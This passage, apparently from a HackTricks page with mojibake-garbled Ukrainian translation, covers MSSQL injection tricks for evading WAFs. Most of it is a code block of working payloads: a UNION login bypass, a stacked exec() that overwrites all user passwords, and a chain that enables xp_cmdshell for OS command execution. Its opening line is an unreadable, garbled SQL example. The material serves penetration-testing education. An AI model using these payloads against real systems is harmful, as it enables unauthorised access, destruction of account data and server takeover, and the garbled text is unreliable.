–í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–π—Ç–µ[tempdb]—Å—Ç–≤–æ—Ä–∏—Ç–∏/**/—Ç–∞–±–ª–∏—Ü—é[test]([id]int)–≤—Å—Ç–∞–≤–∏—Ç–∏[test]–∑–Ω–∞—á–µ–Ω–Ω—è(1)–≤–∏–±—Ä–∞—Ç–∏[id]–∑[test]–≤–∏–¥–∞–ª–∏—Ç–∏/**/—Ç–∞–±–ª–∏—Ü—é[test]
```

Therefore it could be possible to bypass different WAFs that doesn't consider this form of stacking queries. For example:

```
# –î–æ–¥–∞–≤–∞–Ω–Ω—è –Ω–µ–ø–æ—Ç—Ä—ñ–±–Ω–æ–≥–æ exec() –≤ –∫—ñ–Ω—Ü—ñ —Ç–∞ –∑–º—É—à–µ–Ω–Ω—è WAF –≤–≤–∞–∂–∞—Ç–∏, —â–æ —Ü–µ –Ω–µ –¥—ñ–π—Å–Ω–∏–π –∑–∞–ø–∏—Ç
admina'union select 1,'admin','testtest123'exec('select 1')--
## –¶–µ –±—É–¥–µ:
SELECT id, username, password FROM users WHERE username = 'admina'union select 1,'admin','testtest123'
exec('select 1')--'

# –í–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è –¥–∏–≤–Ω–æ –ø–æ–±—É–¥–æ–≤–∞–Ω–∏—Ö –∑–∞–ø–∏—Ç—ñ–≤
admin'exec('update[users]set[password]=''a''')--
## –¶–µ –±—É–¥–µ:
SELECT id, username, password FROM users WHERE username = 'admin'
exec('update[users]set[password]=''a''')--'

# –ê–±–æ —É–≤—ñ–º–∫–Ω–µ–Ω–Ω—è xp_cmdshell
admin'exec('sp_configure''show advanced option'',''1''reconfigure')exec('sp_configure''xp_cmdshell'',''1''reconfigure')--
## –¶–µ –±—É–¥–µ
select * from users where username = ' admin'
exec('sp_configure''show advanced option'',''1''reconfigure')
exec('sp_configure''xp_cmdshell'',''1''reconfigure')--
```

## References

* [https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/](https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/)
* [https://www.gosecure.net/blog/2023/06/21/aws-waf-clients-left-vulnerable-to-sql-injection-due-to-unorthodox-mssql-design-choice/](https://www.gosecure.net/blog/2023/06/21/aws-waf-clients-left-vulnerable-to-sql-injection-due-to-unorthodox-mssql-design-choice/)

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
